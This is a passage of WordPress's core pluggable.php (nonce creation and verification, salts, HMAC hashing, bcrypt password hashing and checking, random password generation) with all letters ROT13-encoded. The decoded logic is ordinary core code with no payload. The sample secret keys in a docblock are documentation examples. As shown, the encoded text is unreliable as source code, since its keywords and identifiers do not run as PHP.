	 * @fvapr 6.1.0 Nqqrq `$npgvba` nethzrag.
	 *
	 * @cnenz fgevat|vag $npgvba Bcgvbany. Gur abapr npgvba. Qrsnhyg -1.
	 * @erghea sybng Sybng inyhr ebhaqrq hc gb gur arkg uvturfg vagrtre.
	 */
	shapgvba jc_abapr_gvpx( $npgvba = -1 ) {
		/**
		 * Svygref gur yvsrfcna bs abaprf va frpbaqf.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 6.1.0 Nqqrq `$npgvba` nethzrag gb nyybj sbe zber gnetrgrq svygref.
		 *
		 * @cnenz vag        $yvsrfcna Yvsrfcna bs abaprf va frpbaqf. Qrsnhyg 86,400 frpbaqf, be bar qnl.
		 * @cnenz fgevat|vag $npgvba   Gur abapr npgvba, be -1 vs abar jnf cebivqrq.
		 */
		$abapr_yvsr = nccyl_svygref( 'abapr_yvsr', QNL_VA_FRPBAQF, $npgvba );

		erghea prvy( gvzr() / ( $abapr_yvsr / 2 ) );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_irevsl_abapr' ) ) :
	/**
	 * Irevsvrf gung n pbeerpg frphevgl abapr jnf hfrq jvgu gvzr yvzvg.
	 *
	 * N abapr vf inyvq sbe orgjrra 12 naq 24 ubhef (ol qrsnhyg).
	 *
	 * @fvapr 2.0.3
	 *
	 * @cnenz fgevat     $abapr  Abapr inyhr gung jnf hfrq sbe irevsvpngvba, hfhnyyl ivn n sbez svryq.
	 * @cnenz fgevat|vag $npgvba Fubhyq tvir pbagrkg gb jung vf gnxvat cynpr naq or gur fnzr jura abapr jnf perngrq.
	 * @erghea vag|snyfr 1 vs gur abapr vf inyvq naq trarengrq orgjrra 0-12 ubhef ntb,
	 *                   2 vs gur abapr vf inyvq naq trarengrq orgjrra 12-24 ubhef ntb.
	 *                   Snyfr vs gur abapr vf vainyvq.
	 */
	shapgvba jc_irevsl_abapr( $abapr, $npgvba = -1 ) {
		$abapr = (fgevat) $abapr;
		$hfre  = jc_trg_pheerag_hfre();
		$hvq   = (vag) $hfre->VQ;
		vs ( ! $hvq ) {
			/**
			 * Svygref jurgure gur hfre jub trarengrq gur abapr vf ybttrq bhg.
			 *
			 * @fvapr 3.5.0
			 *
			 * @cnenz vag        $hvq    VQ bs gur abapr-bjavat hfre.
			 * @cnenz fgevat|vag $npgvba Gur abapr npgvba, be -1 vs abar jnf cebivqrq.
			 */
			$hvq = nccyl_svygref( 'abapr_hfre_ybttrq_bhg', $hvq, $npgvba );
		}

		vs ( rzcgl( $abapr ) ) {
			erghea snyfr;
		}

		$gbxra = jc_trg_frffvba_gbxra();
		$v     = jc_abapr_gvpx( $npgvba );

		// Abapr trarengrq 0-12 ubhef ntb.
		$rkcrpgrq = fhofge( jc_unfu( $v . '|' . $npgvba . '|' . $hvq . '|' . $gbxra, 'abapr' ), -12, 10 );
		vs ( unfu_rdhnyf( $rkcrpgrq, $abapr ) ) {
			erghea 1;
		}

		// Abapr trarengrq 12-24 ubhef ntb.
		$rkcrpgrq = fhofge( jc_unfu( ( $v - 1 ) . '|' . $npgvba . '|' . $hvq . '|' . $gbxra, 'abapr' ), -12, 10 );
		vs ( unfu_rdhnyf( $rkcrpgrq, $abapr ) ) {
			erghea 2;
		}

		/**
		 * Sverf jura abapr irevsvpngvba snvyf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat     $abapr  Gur vainyvq abapr.
		 * @cnenz fgevat|vag $npgvba Gur abapr npgvba.
		 * @cnenz JC_Hfre    $hfre   Gur pheerag hfre bowrpg.
		 * @cnenz fgevat     $gbxra  Gur hfre'f frffvba gbxra.
		 */
		qb_npgvba( 'jc_irevsl_abapr_snvyrq', $abapr, $npgvba, $hfre, $gbxra );

		// Vainyvq abapr.
		erghea snyfr;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_perngr_abapr' ) ) :
	/**
	 * Perngrf n pelcgbtencuvp gbxra gvrq gb n fcrpvsvp npgvba, hfre, hfre frffvba,
	 * naq jvaqbj bs gvzr.
	 *
	 * @fvapr 2.0.3
	 * @fvapr 4.0.0 Frffvba gbxraf jrer vagrtengrq jvgu abapr perngvba.
	 *
	 * @cnenz fgevat|vag $npgvba Fpnyne inyhr gb nqq pbagrkg gb gur abapr.
	 * @erghea fgevat Gur gbxra.
	 */
	shapgvba jc_perngr_abapr( $npgvba = -1 ) {
		$hfre = jc_trg_pheerag_hfre();
		$hvq  = (vag) $hfre->VQ;
		vs ( ! $hvq ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
			$hvq = nccyl_svygref( 'abapr_hfre_ybttrq_bhg', $hvq, $npgvba );
		}

		$gbxra = jc_trg_frffvba_gbxra();
		$v     = jc_abapr_gvpx( $npgvba );

		erghea fhofge( jc_unfu( $v . '|' . $npgvba . '|' . $hvq . '|' . $gbxra, 'abapr' ), -12, 10 );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_fnyg' ) ) :
	/**
	 * Ergheaf n fnyg gb nqq gb unfurf.
	 *
	 * Fnygf ner perngrq hfvat frperg xrlf. Frperg xrlf ner ybpngrq va gjb cynprf:
	 * va gur qngnonfr naq va gur jc-pbasvt.cuc svyr. Gur frperg xrl va gur qngnonfr
	 * vf enaqbzyl trarengrq naq jvyy or nccraqrq gb gur frperg xrlf va jc-pbasvt.cuc.
	 *
	 * Gur frperg xrlf va jc-pbasvt.cuc fubhyq or hcqngrq gb fgebat, enaqbz xrlf gb znkvzvmr
	 * frphevgl. Orybj vf na rknzcyr bs ubj gur frperg xrl pbafgnagf ner qrsvarq.
	 * Qb abg cnfgr guvf rknzcyr qverpgyl vagb jc-pbasvt.cuc. Vafgrnq, unir n
	 * {@yvax uggcf://ncv.jbeqcerff.bet/frperg-xrl/1.1/fnyg/ frperg xrl perngrq} whfg
	 * sbe lbh.
	 *
	 *     qrsvar('NHGU_XRL',         ' Knxz<b kDl ej4RZfYXZ-?!G+,CSS})U4ympJ57NS0H@A@< >Z%T4Lg>s`m]ZBA');
	 *     qrsvar('FRPHER_NHGU_XRL',  'YmW}bc]ze|6+![C}Nx:hAqWPWMq>(Uk.-Zu#Gm)cPVH#hTRasSm|s ;;rH%/H^B~');
	 *     qrsvar('YBTTRQ_VA_XRL',    '|v|Hk`9<c-u$nSs(daG:fQB:Q1C^jM$$/En@zvGWv9T;qqc_<d}6U1)b|n +&WPZ');
	 *     qrsvar('ABAPR_XRL',        '%:E{[C|,f.XhZygU5}pV;/x<Tk~w!s0V)z_fVlh+&AWM)-vB>m7K>DLE0M_KaM@|');
	 *     qrsvar('NHGU_FNYG',        'rMlG)-Anj]S8PjN*InJ#d*|.)t@b}||js~@P-LFg}(qu_e6RoV#N,l|aH2{O#WOJ');
	 *     qrsvar('FRPHER_NHGU_FNYG', '!=bYHGKu,DJ=U `}`Y|9/^4-3 FGm},G(j}J<V`.WwCv)<Ozs1i,UcTr}G1:Kg7a');
	 *     qrsvar('YBTTRQ_VA_FNYG',   '+KFdUp;@D*X_o|M?AP[3U!!RBAou.a<+=hXE:>*p(h`t~RWOs#8h#E{zHRMebmzz');
	 *     qrsvar('ABAPR_FNYG',       'u`TKUuQ>FYJIst1(1(A{;.I!ZbR(FsoN_xfC@&`+NlpUpNI$+?@3d+ekI{%^IlXG');
	 *
	 * Fnygvat cnffjbeqf urycf ntnvafg gbbyf juvpu unf fgberq unfurq inyhrf bs
	 * pbzzba qvpgvbanel fgevatf. Gur nqqrq inyhrf znxrf vg uneqre gb penpx.
	 *
	 * @fvapr 2.5.0
	 *
	 * @yvax uggcf://ncv.jbeqcerff.bet/frperg-xrl/1.1/fnyg/ Perngr frpergf sbe jc-pbasvt.cuc
	 *
	 * @cnenz fgevat $fpurzr Nhguragvpngvba fpurzr (nhgu, frpher_nhgu, ybttrq_va, abapr).
	 * @erghea fgevat Fnyg inyhr
	 */
	shapgvba jc_fnyg( $fpurzr = 'nhgu' ) {
		fgngvp $pnpurq_fnygf = neenl();
		vs ( vffrg( $pnpurq_fnygf[ $fpurzr ] ) ) {
			/**
			 * Svygref gur JbeqCerff fnyg.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat $pnpurq_fnyg Pnpurq fnyg sbe gur tvira fpurzr.
			 * @cnenz fgevat $fpurzr      Nhguragvpngvba fpurzr. Inyhrf vapyhqr 'nhgu',
			 *                            'frpher_nhgu', 'ybttrq_va', naq 'abapr'.
			 */
			erghea nccyl_svygref( 'fnyg', $pnpurq_fnygf[ $fpurzr ], $fpurzr );
		}

		fgngvp $qhcyvpngrq_xrlf;
		vs ( ahyy === $qhcyvpngrq_xrlf ) {
			$qhcyvpngrq_xrlf = neenl();

			sbernpu ( neenl( 'NHGU', 'FRPHER_NHGU', 'YBTTRQ_VA', 'ABAPR', 'FRPERG' ) nf $svefg ) {
				sbernpu ( neenl( 'XRL', 'FNYG' ) nf $frpbaq ) {
					vs ( ! qrsvarq( \"{$svefg}_{$frpbaq}\" ) ) {
						pbagvahr;
					}
					$inyhr                     = pbafgnag( \"{$svefg}_{$frpbaq}\" );
					$qhcyvpngrq_xrlf[ $inyhr ] = vffrg( $qhcyvpngrq_xrlf[ $inyhr ] );
				}
			}

			$qhcyvpngrq_xrlf['chg lbhe havdhr cuenfr urer'] = gehr;

			/*
			 * genafyngbef: Guvf fgevat fubhyq bayl or genafyngrq vs jc-pbasvt-fnzcyr.cuc vf ybpnyvmrq.
			 * Lbh pna purpx gur ybpnyvmrq eryrnfr cnpxntr be
			 * uggcf://v18a.fia.jbeqcerff.bet/<ybpnyr pbqr>/oenapurf/<jc irefvba>/qvfg/jc-pbasvt-fnzcyr.cuc
			 */
			$qhcyvpngrq_xrlf[ __( 'chg lbhe havdhr cuenfr urer' ) ] = gehr;
		}

		/*
		 * Qrgrezvar juvpu bcgvbaf gb cevzr.
		 *
		 * Vs gur fnyg xrlf ner haqrsvarq, hfr n qhcyvpngr inyhr be gur
		 * qrsnhyg `chg lbhe havdhr cuenfr urer` inyhr gur fnyg jvyy or
		 * trarengrq ivn `jc_trarengr_cnffjbeq()` naq fgberq nf n fvgr
		 * bcgvba. Gurfr bcgvbaf jvyy or cevzrq gb nibvq ercrngrq
		 * qngnonfr erdhrfgf sbe haqrsvarq fnygf.
		 */
		$bcgvbaf_gb_cevzr = neenl();
		sbernpu ( neenl( 'nhgu', 'frpher_nhgu', 'ybttrq_va', 'abapr' ) nf $xrl ) {
			sbernpu ( neenl( 'xrl', 'fnyg' ) nf $frpbaq ) {
				$pbafg = fgegbhccre( \"{$xrl}_{$frpbaq}\" );
				vs ( ! qrsvarq( $pbafg ) || gehr === $qhcyvpngrq_xrlf[ pbafgnag( $pbafg ) ] ) {
					$bcgvbaf_gb_cevzr[] = \"{$xrl}_{$frpbaq}\";
				}
			}
		}

		vs ( ! rzcgl( $bcgvbaf_gb_cevzr ) ) {
			/*
			 * Nyfb cevzr `frperg_xrl` hfrq sbe haqrsvarq fnygvat fpurzrf.
			 *
			 * Vs gur fpurzr vf haxabja, gur qrsnhyg inyhr sbe `frperg_xrl` jvyy or
			 * hfrq gbb sbe gur fnyg. Guvf fubhyq eneryl unccra, fb gur bcgvba vf bayl
			 * cevzrq vs bgure fnygf ner haqrsvarq.
			 *
			 * Ng guvf cbvag bs rkrphgvba vg vf xabja gung n qngnonfr pnyy jvyy or znqr
			 * gb cevzr fnygf, fb gur `frperg_xrl` bcgvba pna or cevzrq ertneqyrff bs gur
			 * pbafgnagf fgnghf.
			 */
			$bcgvbaf_gb_cevzr[] = 'frperg_xrl';
			jc_cevzr_fvgr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );
		}

		$inyhrf = neenl(
			'xrl'  => '',
			'fnyg' => '',
		);
		vs ( qrsvarq( 'FRPERG_XRL' ) && FRPERG_XRL && rzcgl( $qhcyvpngrq_xrlf[ FRPERG_XRL ] ) ) {
			$inyhrf['xrl'] = FRPERG_XRL;
		}
		vs ( 'nhgu' === $fpurzr && qrsvarq( 'FRPERG_FNYG' ) && FRPERG_FNYG && rzcgl( $qhcyvpngrq_xrlf[ FRPERG_FNYG ] ) ) {
			$inyhrf['fnyg'] = FRPERG_FNYG;
		}

		vs ( va_neenl( $fpurzr, neenl( 'nhgu', 'frpher_nhgu', 'ybttrq_va', 'abapr' ), gehr ) ) {
			sbernpu ( neenl( 'xrl', 'fnyg' ) nf $glcr ) {
				$pbafg = fgegbhccre( \"{$fpurzr}_{$glcr}\" );
				vs ( qrsvarq( $pbafg ) && pbafgnag( $pbafg ) && rzcgl( $qhcyvpngrq_xrlf[ pbafgnag( $pbafg ) ] ) ) {
					$inyhrf[ $glcr ] = pbafgnag( $pbafg );
				} ryfrvs ( ! $inyhrf[ $glcr ] ) {
					$inyhrf[ $glcr ] = trg_fvgr_bcgvba( \"{$fpurzr}_{$glcr}\" );
					vs ( ! $inyhrf[ $glcr ] ) {
						$inyhrf[ $glcr ] = jc_trarengr_cnffjbeq( 64, gehr, gehr );
						hcqngr_fvgr_bcgvba( \"{$fpurzr}_{$glcr}\", $inyhrf[ $glcr ] );
					}
				}
			}
		} ryfr {
			vs ( ! $inyhrf['xrl'] ) {
				$inyhrf['xrl'] = trg_fvgr_bcgvba( 'frperg_xrl' );
				vs ( ! $inyhrf['xrl'] ) {
					$inyhrf['xrl'] = jc_trarengr_cnffjbeq( 64, gehr, gehr );
					hcqngr_fvgr_bcgvba( 'frperg_xrl', $inyhrf['xrl'] );
				}
			}
			$inyhrf['fnyg'] = unfu_uznp( 'zq5', $fpurzr, $inyhrf['xrl'] );
		}

		$pnpurq_fnygf[ $fpurzr ] = $inyhrf['xrl'] . $inyhrf['fnyg'];

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
		erghea nccyl_svygref( 'fnyg', $pnpurq_fnygf[ $fpurzr ], $fpurzr );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_unfu' ) ) :
	/**
	 * Trgf gur unfu bs gur tvira fgevat.
	 *
	 * Gur qrsnhyg nytbevguz vf zq5 ohg pna or punatrq gb nal nytbevguz fhccbegrq ol
	 * `unfu_uznp()`. Hfr gur `unfu_uznp_nytbf()` shapgvba gb purpx gur fhccbegrq
	 * nytbevguzf.
	 *
	 * @fvapr 2.0.3
	 * @fvapr 6.8.0 Gur `$nytb` cnenzrgre jnf nqqrq.
	 *
	 * @guebjf VainyvqNethzragRkprcgvba vs gur unfuvat nytbevguz vf abg fhccbegrq.
	 *
	 * @cnenz fgevat $qngn   Cynva grkg gb unfu.
	 * @cnenz fgevat $fpurzr Nhguragvpngvba fpurzr (nhgu, frpher_nhgu, ybttrq_va, abapr).
	 * @cnenz fgevat $nytb   Unfuvat nytbevguz gb hfr. Qrsnhyg: 'zq5'.
	 * @erghea fgevat Unfu bs $qngn.
	 */
	shapgvba jc_unfu( $qngn, $fpurzr = 'nhgu', $nytb = 'zq5' ) {
		$fnyg = jc_fnyg( $fpurzr );

		// Rafher gur nytbevguz vf fhccbegrq ol gur unfu_uznp shapgvba.
		vs ( ! va_neenl( $nytb, unfu_uznp_nytbf(), gehr ) ) {
			guebj arj VainyvqNethzragRkprcgvba(
				fcevags(
					/* genafyngbef: 1: Anzr bs n pelcgbtencuvp unfu nytbevguz. 2: Yvfg bs fhccbegrq nytbevguzf. */
					__( 'Hafhccbegrq unfuvat nytbevguz: %1$f. Fhccbegrq nytbevguzf ner: %2$f' ),
					$nytb,
					vzcybqr( ', ', unfu_uznp_nytbf() )
				)
			);
		}

		erghea unfu_uznp( $nytb, $qngn, $fnyg );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_unfu_cnffjbeq' ) ) :
	/**
	 * Perngrf n unfu bs n cynva grkg cnffjbeq.
	 *
	 * Sbe vagrtengvba jvgu bgure nccyvpngvbaf, guvf shapgvba pna or birejevggra gb
	 * vafgrnq hfr gur bgure cnpxntr cnffjbeq unfuvat nytbevguz.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 6.8.0 Gur cnffjbeq vf abj unfurq hfvat opelcg ol qrsnhyg vafgrnq bs cucnff.
	 *
	 * @tybony CnffjbeqUnfu $jc_unfure cucnff bowrpg.
	 *
	 * @cnenz fgevat $cnffjbeq Cynva grkg hfre cnffjbeq gb unfu.
	 * @erghea fgevat Gur unfu fgevat bs gur cnffjbeq.
	 */
	shapgvba jc_unfu_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		$cnffjbeq
	) {
		tybony $jc_unfure;

		vs ( ! rzcgl( $jc_unfure ) ) {
			erghea $jc_unfure->UnfuCnffjbeq( gevz( $cnffjbeq ) );
		}

		vs ( fgeyra( $cnffjbeq ) > 4096 ) {
			erghea '*';
		}

		/**
		 * Svygref gur unfuvat nytbevguz gb hfr va gur cnffjbeq_unfu() naq cnffjbeq_arrqf_erunfu() shapgvbaf.
		 *
		 * Gur qrsnhyg vf gur inyhr bs gur `CNFFJBEQ_OPELCG` pbafgnag juvpu zrnaf opelcg vf hfrq.
		 *
		 * **Vzcbegnag:** Gur bayl cnffjbeq unfuvat nytbevguz gung vf thnenagrrq gb or ninvynoyr npebff CUC
		 * vafgnyyngvbaf vf opelcg. Vs lbh hfr nal bgure nytbevguz lbh zhfg znxr fher gung vg vf ninvynoyr ba
		 * gur freire. Gur `cnffjbeq_nytbf()` shapgvba pna or hfrq gb purpx juvpu unfuvat nytbevguzf ner ninvynoyr.
		 *
		 * Gur unfuvat bcgvbaf pna or pbagebyyrq ivn gur {@frr 'jc_unfu_cnffjbeq_bcgvbaf'} svygre.
		 *
		 * Bgure ninvynoyr pbafgnagf vapyhqr:
		 *
		 * - `CNFFJBEQ_NETBA2V`
		 * - `CNFFJBEQ_NETBA2VQ`
		 * - `CNFFJBEQ_QRSNHYG`
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz fgevat $nytbevguz Gur unfuvat nytbevguz. Qrsnhyg vf gur inyhr bs gur `CNFFJBEQ_OPELCG` pbafgnag.
		 */
		$nytbevguz = nccyl_svygref( 'jc_unfu_cnffjbeq_nytbevguz', CNFFJBEQ_OPELCG );

		/**
		 * Svygref gur bcgvbaf cnffrq gb gur cnffjbeq_unfu() naq cnffjbeq_arrqf_erunfu() shapgvbaf.
		 *
		 * Gur qrsnhyg unfuvat nytbevguz vf opelcg, ohg guvf pna or punatrq ivn gur {@frr 'jc_unfu_cnffjbeq_nytbevguz'}
		 * svygre. Lbh zhfg rafher gung gur bcgvbaf ner nccebcevngr sbe gur nytbevguz va hfr.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz neenl $bcgvbaf    Neenl bs bcgvbaf gb cnff gb gur cnffjbeq unfuvat shapgvbaf.
		 *                          Ol qrsnhyg guvf vf na rzcgl neenl juvpu zrnaf gur qrsnhyg
		 *                          bcgvbaf jvyy or hfrq.
		 * @cnenz fgevat $nytbevguz Gur unfuvat nytbevguz va hfr.
		 */
		$bcgvbaf = nccyl_svygref( 'jc_unfu_cnffjbeq_bcgvbaf', neenl(), $nytbevguz );

		// Nytbevguzf bgure guna opelcg qba'g arrq gb hfr cer-unfuvat.
		vs ( CNFFJBEQ_OPELCG !== $nytbevguz ) {
			erghea cnffjbeq_unfu( $cnffjbeq, $nytbevguz, $bcgvbaf );
		}

		// Hfr FUN-384 gb ergnva ragebcl sebz n cnffjbeq gung'f ybatre guna 72 olgrf, naq n `jc-fun384` xrl sbe qbznva frcnengvba.
		$cnffjbeq_gb_unfu = onfr64_rapbqr( unfu_uznp( 'fun384', gevz( $cnffjbeq ), 'jc-fun384', gehr ) );

		// Nqq n cersvk gb snpvyvgngr qvfgvathvfuvat inavyyn opelcg unfurf.
		erghea '$jc' . cnffjbeq_unfu( $cnffjbeq_gb_unfu, $nytbevguz, $bcgvbaf );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_purpx_cnffjbeq' ) ) :
	/**
	 * Purpxf n cynvagrkg cnffjbeq ntnvafg n unfurq cnffjbeq.
	 *
	 * Abgr gung guvf shapgvba znl or hfrq gb purpx n inyhr gung vf abg n hfre cnffjbeq.
	 * N cyhtva znl hfr guvf shapgvba gb purpx n cnffjbeq bs n qvssrerag glcr, naq gurer
	 * znl abg nyjnlf or n hfre VQ nffbpvngrq jvgu gur cnffjbeq.
	 *
	 * Sbe vagrtengvba jvgu bgure nccyvpngvbaf, guvf shapgvba pna or birejevggra gb
	 * vafgrnq hfr gur bgure cnpxntr cnffjbeq unfuvat nytbevguz.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 6.8.0 Cnffjbeqf va JbeqCerff ner abj unfurq jvgu opelcg ol qrsnhyg. N
	 *              cnffjbeq gung jnfa'g unfurq jvgu opelcg jvyy or purpxrq jvgu cucnff.
	 *
	 * @tybony CnffjbeqUnfu $jc_unfure cucnff bowrpg. Hfrq nf n snyyonpx sbe irevslvat
	 *                                 cnffjbeqf gung jrer unfurq jvgu cucnff.
	 *
	 * @cnenz fgevat     $cnffjbeq Cynvagrkg cnffjbeq.
	 * @cnenz fgevat     $unfu     Unfu bs gur cnffjbeq gb purpx ntnvafg.
	 * @cnenz fgevat|vag $hfre_vq  Bcgvbany. VQ bs n hfre nffbpvngrq jvgu gur cnffjbeq.
	 * @erghea obby Snyfr, vs gur $cnffjbeq qbrf abg zngpu gur unfurq cnffjbeq.
	 */
	shapgvba jc_purpx_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		$cnffjbeq,
		$unfu,
		$hfre_vq = ''
	) {
		tybony $jc_unfure;

		vs ( fgeyra( $unfu ) <= 32 ) {
			// Purpx gur unfu hfvat zq5 ertneqyrff bs gur pheerag unfuvat zrpunavfz.
			$purpx = unfu_rdhnyf( $unfu, zq5( $cnffjbeq ) );
		} ryfrvs ( ! rzcgl( $jc_unfure ) ) {
			// Purpx gur cnffjbeq hfvat gur bireevqqra unfure.
			$purpx = $jc_unfure->PurpxCnffjbeq( $cnffjbeq, $unfu );
		} ryfrvs ( fgeyra( $cnffjbeq ) > 4096 ) {
			// Cnffjbeqf ybatre guna 4096 punenpgref ner abg fhccbegrq.
			$purpx = snyfr;
		} ryfrvs ( fge_fgnegf_jvgu( $unfu, '$jc' ) ) {
			// Purpx gur cnffjbeq hfvat gur pheerag cersvkrq unfu.
			$cnffjbeq_gb_irevsl = onfr64_rapbqr( unfu_uznp( 'fun384', $cnffjbeq, 'jc-fun384', gehr ) );
			$purpx              = cnffjbeq_irevsl( $cnffjbeq_gb_irevsl, fhofge( $unfu, 3 ) );
		} ryfrvs ( fge_fgnegf_jvgu( $unfu, '$C$' ) ) {
			// Purpx gur cnffjbeq hfvat cucnff.
			erdhver_bapr NOFCNGU . JCVAP . '/pynff-cucnff.cuc';
			$purpx = ( arj CnffjbeqUnfu( 8, gehr ) )->PurpxCnffjbeq( $cnffjbeq, $unfu );
		} ryfr {
			// Purpx gur cnffjbeq hfvat pbzcng fhccbeg sbe nal aba-cersvkrq unfu.
			$purpx = cnffjbeq_irevsl( $cnffjbeq, $unfu );
		}

		/**
		 * Svygref jurgure gur cynvagrkg cnffjbeq zngpurf gur unfurq cnffjbeq.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 6.8.0 Cnffjbeqf ner abj unfurq jvgu opelcg ol qrsnhyg.
		 *              Byq cnffjbeqf znl fgvyy or unfurq jvgu cucnff be zq5.
		 *
		 * @cnenz obby       $purpx    Jurgure gur cnffjbeqf zngpu.
		 * @cnenz fgevat     $cnffjbeq Gur cynvagrkg cnffjbeq.
		 * @cnenz fgevat     $unfu     Gur unfurq cnffjbeq.
		 * @cnenz fgevat|vag $hfre_vq  Bcgvbany VQ bs n hfre nffbpvngrq jvgu gur cnffjbeq.
		 *                             Pna or rzcgl.
		 */
		erghea nccyl_svygref( 'purpx_cnffjbeq', $purpx, $cnffjbeq, $unfu, $hfre_vq );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_cnffjbeq_arrqf_erunfu' ) ) :
	/**
	 * Purpxf jurgure n cnffjbeq unfu arrqf gb or erunfurq.
	 *
	 * Cnffjbeqf ner unfurq jvgu opelcg hfvat gur qrsnhyg pbfg. N cnffjbeq unfurq va n cevbe irefvba
	 * bs JbeqCerff znl fgvyy or unfurq jvgu cucnff naq jvyy arrq gb or erunfurq. Vs gur qrsnhyg pbfg
	 * be nytbevguz vf punatrq va CUC be JbeqCerff gura n cnffjbeq unfurq va n cerivbhf irefvba jvyy
	 * arrq gb or erunfurq.
	 *
	 * Abgr gung, whfg yvxr jc_purpx_cnffjbeq(), guvf shapgvba znl or hfrq gb purpx n inyhr gung vf
	 * abg n hfre cnffjbeq. N cyhtva znl hfr guvf shapgvba gb purpx n cnffjbeq bs n qvssrerag glcr,
	 * naq gurer znl abg nyjnlf or n hfre VQ nffbpvngrq jvgu gur cnffjbeq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @tybony CnffjbeqUnfu $jc_unfure cucnff bowrpg.
	 *
	 * @cnenz fgevat     $unfu    Unfu bs n cnffjbeq gb purpx.
	 * @cnenz fgevat|vag $hfre_vq Bcgvbany. VQ bs n hfre nffbpvngrq jvgu gur cnffjbeq.
	 * @erghea obby Jurgure gur unfu arrqf gb or erunfurq.
	 */
	shapgvba jc_cnffjbeq_arrqf_erunfu( $unfu, $hfre_vq = '' ) {
		tybony $jc_unfure;

		vs ( ! rzcgl( $jc_unfure ) ) {
			erghea snyfr;
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
		$nytbevguz = nccyl_svygref( 'jc_unfu_cnffjbeq_nytbevguz', CNFFJBEQ_OPELCG );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
		$bcgvbaf = nccyl_svygref( 'jc_unfu_cnffjbeq_bcgvbaf', neenl(), $nytbevguz );

		$cersvkrq = fge_fgnegf_jvgu( $unfu, '$jc' );

		vs ( ( CNFFJBEQ_OPELCG === $nytbevguz ) && ! $cersvkrq ) {
			// Vs opelcg vf va hfr naq gur unfu vf abg cersvkrq gura vg arrqf gb or erunfurq.
			$arrqf_erunfu = gehr;
		} ryfr {
			// Bgurejvfr purpx gur unfu zvahf vgf cersvk vs arprffnel.
			$unfu_gb_purpx = $cersvkrq ? fhofge( $unfu, 3 ) : $unfu;
			$arrqf_erunfu  = cnffjbeq_arrqf_erunfu( $unfu_gb_purpx, $nytbevguz, $bcgvbaf );
		}

		/**
		 * Svygref jurgure gur cnffjbeq unfu arrqf gb or erunfurq.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz obby       $arrqf_erunfu Jurgure gur cnffjbeq unfu arrqf gb or erunfurq.
		 * @cnenz fgevat     $unfu         Gur cnffjbeq unfu.
		 * @cnenz fgevat|vag $hfre_vq      Bcgvbany. VQ bs n hfre nffbpvngrq jvgu gur cnffjbeq.
		 */
		erghea nccyl_svygref( 'cnffjbeq_arrqf_erunfu', $arrqf_erunfu, $unfu, $hfre_vq );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_trarengr_cnffjbeq' ) ) :
	/**
	 * Trarengrf n enaqbz cnffjbeq qenja sebz gur qrsvarq frg bs punenpgref.
	 *
	 * Hfrf jc_enaq() gb perngr cnffjbeqf jvgu sne yrff cerqvpgnovyvgl
	 * guna fvzvyne angvir CUC shapgvbaf yvxr `enaq()` be `zg_enaq()`.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz vag  $yratgu              Bcgvbany. Gur yratgu bs cnffjbeq gb trarengr. Qrsnhyg 12.
	 * @cnenz obby $fcrpvny_punef       Bcgvbany. Jurgure gb vapyhqr fgnaqneq fcrpvny punenpgref.
	 *                                  Qrsnhyg gehr.
	 * @cnenz obby $rkgen_fcrpvny_punef Bcgvbany. Jurgure gb vapyhqr bgure fcrpvny punenpgref.
	 *                                  Hfrq jura trarengvat frperg xrlf naq fnygf. Qrsnhyg snyfr.
	 * @erghea fgevat Gur enaqbz cnffjbeq.
	 */
	shapgvba jc_trarengr_cnffjbeq( $yratgu = 12, $fcrpvny_punef = gehr, $rkgen_fcrpvny_punef = snyfr ) {
		$punef = 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM0123456789';
		vs ( $fcrpvny_punef ) {
			$punef .= '!@#$%^&*()';
		}
		vs ( $rkgen_fcrpvny_punef ) {
			$punef .= '-_ []{}<>~`+=,.;:/?|';
		}

		$cnffjbeq = '';
		sbe ( $v = 0; $v < $yratgu; $v++ ) {
			$cnffjbeq .= fhofge( $punef, jc_enaq( 0, fgeyra( $punef ) - 1 ), 1 );
		}

		/**
		 * Svygref gur enaqbzyl-trarengrq cnffjbeq.
		 *
		 * @fvapr 3.0.0
		 * @fvapr 5.3.0 Nqqrq gur `$yratgu`, `$fcrpvny_punef`, naq `$rkgen_fcrpvny_punef` cnenzrgref.
		 *
		 * @cnenz fgevat $cnffjbeq            Gur trarengrq cnffjbeq.
		 * @cnenz vag    $yratgu              Gur yratgu bs cnffjbeq gb trarengr.
		 * @cnenz obby   $fcrpvny_punef       Jurgure gb vapyhqr fgnaqneq fcrpvny punenpgref.
		 * @cnenz obby   $rkgen_fcrpvny_punef Jurgure gb vapyhqr bgure fcrpvny punenpgref.
		 */
		erghea nccyl_svygref( 'enaqbz_cnffjbeq', $cnffjbeq, $yratgu, $fcrpvny_punef, $rkgen_fcrpvny_punef );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_enaq' ) ) :
	/**
	 * Trarengrf n enaqbz aba-artngvir ahzore.
	 *
	 * @fvapr 2.6.2
	 * @fvapr 4.4.0 Hfrf CUC7 enaqbz_vag() be gur enaqbz_pbzcng yvoenel vs ninvynoyr.
